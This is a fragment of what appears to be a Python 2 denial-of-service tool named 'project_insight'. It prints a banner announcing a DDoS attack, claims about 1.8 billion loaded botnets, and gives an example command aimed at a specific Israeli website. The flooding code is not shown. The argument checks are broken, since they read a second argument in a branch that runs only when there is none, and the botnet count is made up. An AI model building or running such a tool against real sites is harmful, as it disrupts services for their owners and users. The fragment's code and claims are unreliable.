...
def usage():
	print 'Distributed Denail of Service Attack (DDOS)'
	print 'New loaded Botnets: 1,798,445,657'
	print 'Usage: project_insight (url)'
	print 'Example: project_insight.py http://luthi.co.il/'
	print "\a" 
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "Hang tight starting DDOS"
		print "HackGodybj"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
